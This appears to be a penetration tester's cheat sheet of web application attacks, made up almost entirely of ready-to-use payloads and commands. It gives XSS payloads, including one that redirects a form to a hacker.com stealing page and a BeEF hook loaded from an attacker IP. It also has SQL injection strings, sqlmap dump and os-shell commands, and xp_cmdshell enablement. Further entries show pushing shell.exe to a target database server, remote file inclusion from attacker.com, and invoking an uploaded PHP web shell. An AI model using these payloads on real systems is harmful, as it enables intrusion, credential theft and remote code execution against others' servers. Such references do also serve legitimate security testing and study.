### Web Application Security
_1.1 Cross-Site Scripting (XSS)_  
```
Reflected/Stored XSS
<H1>Test</H1> //Simple test for sanitization of input
<script>alert('XSS');</script> //Typical XSS test input field script
<script>alert(document.cookie)</script> //Display current session cookie in alert

DOM XSS - Runs on Client-side / Victim browser
//If input in the URL value gets reflected in the form input field, DOM
Example: site.com/donate.php#amount="><img src="aaa" onerror="alert(document.domain)">
"><svg/onload="alert(document.domain)">

//In Web Console
document.forms[1].action="test.html" //Sends the form action "senddonation.php" or selected action to non-existent test.html page, if this works, can add same payload to svg tag and send cookies to attacker site.
Example: site.com/donate.php#amount="><svg/onload="document.forms[1].action='//hacker.com/steal.php'">

BEEF XSS
//edit the beef config file at
/etc/beef-xss/config.yml
Permitted UI Subnet: Allow only local machine
Permitted Hooking Subnet: Allow hooking only from in-scope subnet
Let BEEF listen on port 80 or 443
<script> src="http://AttackerIP:80/hook.js"></script>
```

_1.2 SQL Injection (SQLi)_
```
Finding SQLi
Test parameter with an always true and always false condition.
id=2' and 'a'a='a //always true statement
id=2' and 'a'='b //always false 
and 'a'='a'
') or 1=1; -- //space minus minus space

In-band SQL Injections
clientinfo.php?id=200 //changing id parameter pulls up different client profile
' UNION SELECT null,null,null; -- - //continue adding nulls until true statement is reached, 
test whether null variables are strings or integers, Ex. change nulls to, 'els1', 2222, 'els3'
//To display output in browser select nonexistent id parameter value
//Can change null variable values to return valuable information about database
id=9999' UNION SELECT @@version, 2222, 'els3'; -- - 
http://pentestmonkey.net/category/cheat-sheet

Error-based SQL Injections
//When testing for SQLi returns a SQL error, can use SQL errors to return useful information
id=1 or @@version=1);--

Blind SQL Injection
blind2.sh 20 //checks 20 characters of query result
blind3.sh 20 "Select user()" //checks 20 characters of result of custom query sent to db
```
```
SQLMap
sqlmap -u 'http://sqlmap.com/search.php?search=n' -p search --technique=U -D blogdb -T users -C username,password --dump
sqlmap -r /root/bloglogin.req -p user --technique=B --banner //uses saved Burpsuite request
--os-cmd and --os-shell //SQLMap takeover flags
```
```
Advanced SQL Server Exploitation
SELECT name, password FROM master..sysxlogins //MSSQL Server 2000
SELECT name, password_hash FROM master.sys.sql_logins //For MSSQL Server >=2005
EXEC master..xp_cmdshell '<command>' //Can be used to run any OS command, need sa privs

//Enable xp_cmdshell as sa user or with sa privs
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

Reading the File System
//Read the result of the dir command by saving output to web accessible folder
EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--
//can browse to dir.txt at the URL, http://site.com/dir.txt

//Put file content into a table and extract the table via SQLi
CREATE TABLE filecontent(line varcar(8000));
BULK INSERT filecontent FROM '<target file>';
/* Remember to drop the table after extracting it:
DROP TABLE filecontent;
*/

Upload Files
//Insert file into a table in MS SQL db
CREATE TABLE HelperTable (file text)
BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
//Force target DB server to retrieve file from our SQL server, read exe file from table and recreate it remotely.
EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c Craw -S<SQL Server Address> -U<Our Server Username> -P<Our Server Password>'

Advanced MySQL Exploitation
SELECT LOAD_FILE('<text file path>'); //read files by using the load_file function
//Parse content of a file
CREATE TABLE temptable(output longtext);
LOAD DATA INFILE '/etc/passwd' INTO TABLE temptable FIELDS
TERMINATED BY '\n' (output);
```
_1.3 Other Web Attack_
```
File Inclusion/Path Traversal
//Can try path traversal after having successfully uploaded a file to webapp, by attempting to browse to root folder, in Linux:
Example: fileshare.com/files.php?file=../../../../../../etc/passwd
Remote File Inclusion
Example: fileshare.com/files.php?file=http://attacker.com/shells/shell.txt

Unrestricted File Upload
//If file upload doesnt check against file extension uploads, can upload file such as shell2.php and browse
to that file upload location with the cmd parameter such as:
Example: fileshare.com/avatars/shell2.php?cmd=ls
```
